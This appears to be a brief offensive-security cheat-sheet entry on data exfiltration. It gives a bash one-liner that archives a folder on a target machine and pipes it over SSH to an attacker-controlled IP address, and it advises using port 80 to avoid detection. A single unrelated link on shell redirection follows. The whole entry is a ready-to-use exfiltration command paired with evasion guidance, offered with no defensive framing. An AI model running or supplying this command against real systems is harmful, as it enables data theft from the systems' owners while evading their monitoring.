# Data Exfiltration
##### From target, tar folder containing data and pipe to SSH.
##### Port 80 may be best, to avoid detection on port 22.
##### Process will untar file to /tmp/datafolder.
```bash
tar zcf - /tmp/datafolder | ssh <user>@<Attack IP Address> "cd /tmp; tar zxpf -"
```

### Data Exfiltration References
[BASH Shell Redirect stderr To stdout (redirect stderr to a File)](https://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/)